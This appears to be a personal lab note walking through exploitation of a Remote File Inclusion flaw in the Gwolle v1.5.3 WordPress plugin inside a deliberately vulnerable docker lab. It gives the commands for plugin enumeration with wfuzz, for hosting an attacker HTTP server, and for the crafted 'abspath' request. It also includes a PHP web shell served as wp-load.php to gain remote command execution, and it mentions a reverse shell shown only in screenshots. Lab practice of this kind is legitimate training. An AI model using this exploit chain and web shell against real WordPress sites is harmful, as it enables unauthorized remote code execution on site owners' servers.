# Definition
Something to do!!
## Installing and Preparing lab
I will use [dvwp docker lab](https://github.com/vavkamil/dvwp) to practice with this vulnerability.
```shell
git clone https://github.com/vavkamil/dvwp
cd dvwp
docker-compose up -d --build
```
___
Now, we must do initial WordPress configuration.
![[Pasted image 20230713161850.png]]
___
After, we have to import the RFI vulnerable plugin called **Gwolle v1.5.3**.
You can download this plugin and its version with this [link](https://downloads.wordpress.org/plugin/gwolle-gb.1.5.3.zip).
So, to import and enable this plugin we must grant privileges on www-data user inside the docker machine.
```shell
docker exec -it dvwp_wordpress_1 bash
```
___
```shell
chown www-data:www-data -R ./wp-content/
```
![[Pasted image 20230713163852.png]]
___
Then, if we see the exploit requirements, with *searchsploit -x php/webapps/38861.txt*, we can note that this exploit needs **allow_url_include** actived.
![[Pasted image 20230713164457.png]]
___
Then, we should do the following inside de docker machine.
![[Pasted image 20230713171733.png]]
___
And restart the docker machine.
```shell
docker restart dvwp_wordpress_1 
```
___
Finally, we are going to import that plugin.
![[Pasted image 20230713165148.png]]
___
# Attacking
Now that we have the docker machine with this vulnerability, we could first do a [[Wfuzz]] scanning to scan plugins.
```shell
wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://localhost:31337/FUZZ
```
Where:
- -c: Color format.
- --hc:404: hide 404 status code findings.
- -t 200: use 200 threads.
- -w <_WORD_LIST_PATH_>: we use wp-plugins.fuzz.txt word list to find out plugins.
- URL/FUZZ: */* because the word list doesn't contains */* and FUZZ to replace each line in word list.
___
![[Pasted image 20230713170531.png]]
___
After reading how the exploit works.
![[Pasted image 20230713170906.png]]
___
We can deploy a http server to retrieve connections from the victim.
```shell
sudo python3 -m http.server 80
```
___
And send request.
```url
http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://172.17.0.1/
```
![[Pasted image 20230713171941.png]]
___
You can see that the GET request is trying to load some **/wp-load.php**. Let's use this try to do a RCE.
*wp-load.php* from attacker side.
```php
<?php
	system($_GET["cmd"]);
?>
```
![[Pasted image 20230713173006.png]]
___
Now you can use a Reverse Shell with this RFI.
![[Pasted image 20230713173241.png]]
___